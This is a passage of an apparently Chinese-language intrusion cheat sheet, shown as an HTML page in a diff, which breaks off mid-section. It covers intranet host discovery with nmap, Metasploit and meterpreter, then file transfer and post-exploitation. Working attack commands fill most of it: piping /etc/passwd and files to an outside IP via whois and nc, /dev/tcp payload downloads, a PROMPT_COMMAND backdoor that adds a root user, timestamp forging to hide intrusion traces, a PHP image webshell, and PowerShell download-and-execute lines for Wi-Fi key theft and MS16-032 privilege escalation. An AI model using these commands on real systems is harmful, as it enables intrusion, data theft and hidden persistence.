+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#998;font-style:italic"># wget https://nmap.org/dist/nmap-7.40.tar.bz2</span>
+<span style="color:#998;font-style:italic"># bzip2 -cd nmap-7.40.tar.bz2 | tar xvf -</span>
+<span style="color:#998;font-style:italic"># cd nmap-7.40</span> 
+<span style="color:#998;font-style:italic"># ./configure  这里可以用--prefix指定安装路径</span>
+<span style="color:#998;font-style:italic"># echo ?</span>
+<span style="color:#998;font-style:italic"># make</span>
+<span style="color:#998;font-style:italic"># make install</span>
+<span style="color:#998;font-style:italic"># echo ?</span>
+<span style="color:#998;font-style:italic"># make install</span>
+<span style="color:#998;font-style:italic"># echo ?</span>	
+<span style="color:#998;font-style:italic"># nmap -sn -PR 192.168.1.0/24  尝试arp扫描</span>
+</code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>
+<p>处在别人的vpn内网(kali)</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">netdiscover -r 192.168.1.0/24 -i eth0
+  
+msf的arp扫描模块
+  
+msf &gt; use  auxiliary/scanner/discovery/arp_sweep
+msf &gt; show options
+msf &gt; <span style="color:#0086b3">set</span>  interface eth0
+msf &gt; <span style="color:#0086b3">set</span>  smac 00:0c:29:92:fd:85
+msf &gt; <span style="color:#0086b3">set</span>  rhosts 192.168.1.0/24
+msf &gt; <span style="color:#0086b3">set</span>  threads 20
+msf &gt; <span style="color:#0086b3">set</span>  shost 192.168.1.27
+msf &gt; run
+</code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>meterpreter</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">meterpreter &gt; getsystem 	另外,在目标机器上扫描时,务必先提权<span style="color:#000;font-weight:bold">(</span>个人建议,会方便很多<span style="color:#000;font-weight:bold">)</span>,不然扫描过程中可能会有些问题
+meterpreter &gt; run autoroute -s 192.168.1.0/24
+meterpreter &gt; run post/windows/gather/arp_scanner <span style="color:#008080">RHOSTS</span><span style="color:#000;font-weight:bold">=</span>192.168.1.0/24
+</code></pre></td></tr></table>
+</div>
+</div></li>
+</ul>
+<h2 id="基于smb和netbios的内网主机发现方式">基于smb和netbios的内网主机发现方式</h2>
+<p>win下:</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nbtscan.exe -m  192.168.1.0/24   非常经典的小工具
+</code></pre></td></tr></table>
+</div>
+</div><p>linux下:</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">wget http://www.unixwiz.net/tools/nbtscan-source-1.0.35.tgz
+tar -zxvf nbtscan-source-1.0.35.tgz
+make
+<span style="color:#0086b3">echo</span> ?
+./nbtscan -h
+./nbtscan -m 192.168.1.0/24
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="域内扫描">域内扫描</h2>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">net view
+dsquery computer  其实,域内最好用的也就是nbtscan了
+</code></pre></td></tr></table>
+</div>
+</div><p>Ps:如果计算机名很多的时候，可以利用bat批量ping获取ip</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">@echo off
+setlocal ENABLEDELAYEDEXPANSION
+@FOR /F <span style="color:#d14">&#34;usebackq eol=- skip=1 delims=\&#34; %%j IN (`net view ^| find &#34;</span>命令成功完成<span style="color:#d14">&#34; /v ^|find &#34;</span>The <span style="color:#0086b3">command</span> completed successfully.<span style="color:#d14">&#34; /v`) DO (
+</span><span style="color:#d14">@FOR /F &#34;</span>usebackq <span style="color:#008080">delims</span><span style="color:#000;font-weight:bold">=</span><span style="color:#d14">&#34; %%i IN (`@ping -n 1 -4 %%j ^| findstr &#34;</span>Pinging<span style="color:#d14">&#34;`) DO (
+</span><span style="color:#d14">@FOR /F &#34;</span>usebackq <span style="color:#008080">tokens</span><span style="color:#000;font-weight:bold">=</span><span style="color:#099">2</span> <span style="color:#008080">delims</span><span style="color:#000;font-weight:bold">=[]</span><span style="color:#d14">&#34; %%k IN (`echo %%i`) DO (echo %%k  %%j)
+</span><span style="color:#d14">)
+</span><span style="color:#d14">)
+</span></code></pre></td></tr></table>
+</div>
+</div><h2 id="各种脚本语言不同版本一句话开启-http-服务器的总结">各种脚本语言不同版本一句话开启 HTTP 服务器的总结</h2>
+<h3 id="python-2x"><strong>Python 2.x</strong></h3>
+<p><code> python -m SimpleHTTPServer 8000</code></p>
+<h3 id="python-3x"><strong>Python 3.x</strong></h3>
+<p><code> python -m http.server 8000</code></p>
+<h3 id="twisted-python"><strong>Twisted (Python)</strong></h3>
+<p><code> twistd -n web -p 8000 --path .</code></p>
+<p>Or：</p>
+<pre><code>python -c 'from twisted.web.server import Site; from twisted.web.static import File; from twisted.internet import reactor; reactor.listenTCP(8000, Site(File(&quot;.&quot;))); reactor.run()'
+</code></pre><h3 id="ruby"><strong>Ruby</strong></h3>
+<p><code>ruby -rwebrick -e'WEBrick::HTTPServer.new(:Port =&gt; 8000, :DocumentRoot =&gt; Dir.pwd).start'</code></p>
+<h4 id="ruby-192"><strong>Ruby 1.9.2+</strong></h4>
+<p><code>ruby -run -ehttpd . -p8000</code></p>
+<h4 id="adsf-ruby"><strong>adsf (Ruby)</strong></h4>
+<pre><code>gem install adsf # install dependency
+adsf -p 8000
+</code></pre><h4 id="sinatra-ruby"><strong>Sinatra (Ruby)</strong></h4>
+<pre><code>gem install sinatra # install dependency
+ruby -rsinatra -e'set :public_folder, &quot;.&quot;; set :port, 8000'
+</code></pre><h3 id="perl"><strong>Perl</strong></h3>
+<pre><code> cpan HTTP::Server::Brick # install dependency
+ perl -MHTTP::Server::Brick -e 's=HTTP::Server::Brick-&gt;new(port=&gt;8000); s-&gt;mount(&quot;/&quot;=&gt;{path=&gt;&quot;.&quot;}); s-&gt;start'
+</code></pre><h4 id="plack-perl">Plack (Perl)</h4>
+<pre><code> cpan Plack # install dependency
+ plackup -MPlack::App::Directory -e 'Plack::App::Directory-&gt;new(root=&gt;&quot;.&quot;);' -p 8000
+</code></pre><h4 id="mojolicious-perl">Mojolicious (Perl)</h4>
+<pre><code> cpan Mojolicious::Lite # install dependency
+ perl -MMojolicious::Lite -MCwd -e 'app-&gt;static-&gt;paths-&gt;[0]=getcwd; app-&gt;start' daemon -l http://*:8000
+</code></pre><h3 id="http-server-nodejs">http-server (Node.js)</h3>
+<pre><code> npm install -g http-server # install dependency
+ http-server -p 8000
+</code></pre><h3 id="node-static-nodejs">node-static (Node.js)</h3>
+<pre><code> npm install -g node-static # install dependency
+ static -p 8000
+</code></pre><h3 id="php--54">PHP (&gt;= 5.4)</h3>
+<pre><code> php -S 127.0.0.1:8000
+</code></pre><h3 id="erlang">Erlang</h3>
+<pre><code>erl -s inets -eval 'inets:start(httpd,[{server_name,&quot;NAME&quot;},{document_root, &quot;.&quot;},{server_root, &quot;.&quot;},{port, 8000},{mime_types,[{&quot;html&quot;,&quot;text/html&quot;},{&quot;htm&quot;,&quot;text/html&quot;},{&quot;js&quot;,&quot;text/javascript&quot;},{&quot;css&quot;,&quot;text/css&quot;},{&quot;gif&quot;,&quot;image/gif&quot;},{&quot;jpg&quot;,&quot;image/jpeg&quot;},{&quot;jpeg&quot;,&quot;image/jpeg&quot;},{&quot;png&quot;,&quot;image/png&quot;}]}]).'
+</code></pre><h3 id="busybox-httpd">busybox httpd</h3>
+<pre><code>busybox httpd -f -p 8000
+</code></pre><h3 id="webfs">webfs</h3>
+<pre><code>webfsd -F -p 8000
+</code></pre><h3 id="iis-express">IIS Express</h3>
+<pre><code>C:&gt; &quot;C:\Program Files (x86)\IIS Express\iisexpress.exe&quot; /path:C:\MyWeb /port:8000
+</code></pre><h3 id="whois">Whois</h3>
+<p>接受端：</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc -vlnp <span style="color:#099">8000</span> | sed <span style="color:#d14">&#34;s/ //g&#34;</span> | base64 -d 
+</code></pre></td></tr></table>
+</div>
+</div><p>发送端：</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">whois -h 47.107.82.71 -p <span style="color:#099">8000</span> <span style="color:#d14">`</span>cat /etc/passwd | base64<span style="color:#d14">`</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="nc">NC</h3>
+<p>接收端：</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc -lvvp <span style="color:#099">8000</span> &gt; test.txt
+
+cat &lt; /dev/tcp/10.10.10.200/8000 &gt; 1.txt
+</code></pre></td></tr></table>
+</div>
+</div><p>发送端：</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat test.txt | nc  47.107.82.71 8000
+
+nc 47.107.82.71 <span style="color:#099">8000</span> &lt; 10000.txt
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="smb">SMB</h3>
+<p><a href="https://github.com/SecureAuthCorp/impacket">impacket工具下载</a></p>
+<p>kali中已集成该工具</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> <span style="color:#998;font-style:italic">#在当前目录启动 SMB server，共享名称为 share</span>
+ impacket-smbserver share <span style="color:#d14">`</span><span style="color:#0086b3">pwd</span><span style="color:#d14">`</span> 
+</code></pre></td></tr></table>
+</div>
+</div><p>下载文件：</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#0086b3">copy </span>\\IP\ShareName\File.exe file.exe
+</code></pre></td></tr></table>
+</div>
+</div><p>上传文件：</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">net use x: \\IP\ShareName
+<span style="color:#0086b3">copy </span>file.txt x:
+net use x: /delete
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="bash">Bash</h3>
+<p>接收端</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc -lvnp <span style="color:#099">8000</span> &gt; test.txt    
+</code></pre></td></tr></table>
+</div>
+</div><p>发送端</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat test.txt &gt; /dev/tcp/ip/port
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="linux">Linux</h2>
+<p>Linux反弹shell后，方便的交互：</p>
+<pre><code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+</code></pre><p>无python时：</p>
+<pre><code>expect -c 'spawn bash;interact'
+</code></pre><p>无wget nc等下载工具时下载文件</p>
+<pre><code>exec 5&lt;&gt;/dev/tcp/sec-lab.org/80 &amp;&amp;echo -e “GET /c.pl HTTP/1.0\n” &gt;&amp;5 &amp;&amp; cat&lt;&amp;5 &gt; c.pl
+</code></pre><p>修改上传文件时间戳(掩盖入侵痕迹)</p>
+<p><code>touch -r</code> 老文件时间戳 新文件时间戳</p>
+<h3 id="利用bash提权">利用BASH提权</h3>
+<p>这个要求管理员有su的习惯，我们可以通过它来添加一个id=0的用户
+<code>PROMPT_COMMAND</code> 利用这个变量保存了在主提示符PS1显示之前需要执行的命令
+导入:</p>
+<pre><code>export PROMPT_COMMAND=”/usr/sbin/useradd -o -u 0 hack &amp;&gt;/dev/null &amp;&amp; echo hacker:123456 | /usr/sbin/chpasswd &amp;&gt;/dev/null &amp;&amp; unset PROMPT_COMMAND”
+</code></pre><h3 id="lsof-命令"><strong>lsof 命令</strong></h3>
+<pre><code>lsof 1.txt 显示开启文件 abc.txt 的进程
+lsof -i :22 知道 22 端口现在运行什么程序
+lsof -c nsd 显示 nsd 进程现在打开的文件
+lsof -g gid 显示归属 gid 的进程情况
+lsof +d /usr/local/ 显示目录下被进程开启的文件
+lsof +D /usr/local/ 同上，但是会搜索目录下的目录，时间较长
+lsof -d 4 显示使用 fd 为4 的进程
+lsof -i 用以显示符合条件的进程情况
+</code></pre><h3 id="ssh端口转发">SSH端口转发</h3>
+<p>下面文章详细描述了3种方式转发
+<a href="https://www.cnblogs.com/david-zhang-index/archive/2012/08/18/2645943.html">https://www.cnblogs.com/david-zhang-index/archive/2012/08/18/2645943.html</a></p>
+<p>plink用法</p>
+<pre><code>plink.exe root@10.10.10.100 -batch -pw 123456 -c &quot;uname -a&quot;
+E:&gt;plink.exe root@10.10.10.100 -batch -pw 123456 -c &quot;uname -a&quot;
+Linux CentOS6 2.6.32-642.el6.i686 #1 SMP Tue May 10 16:13:51 UTC 2016 i686 i686 i386 GNU/Linux
+</code></pre><h3 id="图片马"><strong>图片马</strong></h3>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">Exiftool “-comment&lt;<span style="color:#000;font-weight:bold">=</span>raj.php” 1.png
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="windows">Windows</h2>
+<h3 id="powershell"><strong>Powershell</strong></h3>
+<p>获取无线密码：</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell -nop -exec bypass -c <span style="color:#d14">&#34;IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Get-WLAN-Keys.ps1&#39;);Get-Wlan-Keys &#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>提权加账号</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell -nop -exec bypass -c <span style="color:#d14">&#34;IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1&#39;);Invoke-MS16-032 -Application cmd.exe -commandline &#39;/c net user evi1cg test123 /add&#39;&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>下载执行：</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell -w hidden -c (<span style="color:#0086b3">new-object</span> System.Net.WebClient).Downloadfile(<span style="color:#d14">&#39;http://b.hiphotos.baidu.com/image/pic/item/d009b3de9c82d15825ffd75c840a19d8bd3e42da.jpg&#39;</span>,<span style="color:#d14">&#39;C:\Users\Public\test.jpg&#39;</span>) &amp; <span style="color:#0086b3">start </span>C:\Users\Public\test.jpg
+</code></pre></td></tr></table>
+</div>
+</div><p>摄像头录像：</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
